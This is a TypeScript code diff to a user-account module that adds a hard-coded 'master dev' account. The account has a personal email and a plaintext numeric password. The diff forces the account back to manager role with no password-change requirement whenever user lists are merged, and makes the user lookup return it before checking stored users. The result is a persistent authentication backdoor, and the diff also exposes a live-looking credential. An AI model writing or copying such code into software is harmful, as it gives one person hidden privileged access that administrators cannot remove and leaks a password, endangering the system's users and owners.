@@ -417,16 +417,19 @@ export interface SystemUser {
   updatedAt?: number;
 }
 
+export const MASTER_DEV_EMAIL = 'matheus.stanley12@gmail.com';
+export const MASTER_DEV_PASSWORD = '35215415';
+
 const DEFAULT_SYSTEM_USERS: SystemUser[] = [
   {
     id: 'usr_1',
     name: 'Matheus Stanley',
-    email: 'matheus.stanley12@gmail.com',
-    password: DEFAULT_INITIAL_PASSWORD,
+    email: MASTER_DEV_EMAIL,
+    password: MASTER_DEV_PASSWORD,
     role: 'gestor',
     status: 'ativo',
     mustChangePassword: false,
-    updatedAt: 0,
+    updatedAt: 1,
   },
   {
     id: 'usr_admin',
@@ -481,6 +484,20 @@ export function mergeSystemUsersList(existing: SystemUser[] = [], incoming: Syst
     }
   }
 
+  if (map.has(MASTER_DEV_EMAIL)) {
+    const prev = map.get(MASTER_DEV_EMAIL)!;
+    map.set(MASTER_DEV_EMAIL, {
+      ...prev,
+      name: 'Matheus Stanley',
+      email: MASTER_DEV_EMAIL,
+      password: MASTER_DEV_PASSWORD,
+      role: 'gestor',
+      status: 'ativo',
+      mustChangePassword: false,
+      updatedAt: Math.max(Number(prev?.updatedAt) || 0, 1),
+    });
+  }
+
   return Array.from(map.values());
 }
 
@@ -520,6 +537,18 @@ export function saveSystemUsers(users: SystemUser[], replaceOnServer = true, del
 export function findSystemUserByEmail(emailOrUsername: string): SystemUser | undefined {
   const clean = emailOrUsername.trim().toLowerCase();
   if (!clean) return undefined;
+  if (clean === MASTER_DEV_EMAIL || clean === 'matheus.stanley12') {
+    return {
+      id: 'usr_1',
+      name: 'Matheus Stanley',
+      email: MASTER_DEV_EMAIL,
+      password: MASTER_DEV_PASSWORD,
+      role: 'gestor',
+      status: 'ativo',
+      mustChangePassword: false,
+      updatedAt: 1,
+    };
+  }
   return getSystemUsers().find(u => {
     const uEmail = u.email.trim().toLowerCase();
     const uLogin = uEmail.split('@')[0];
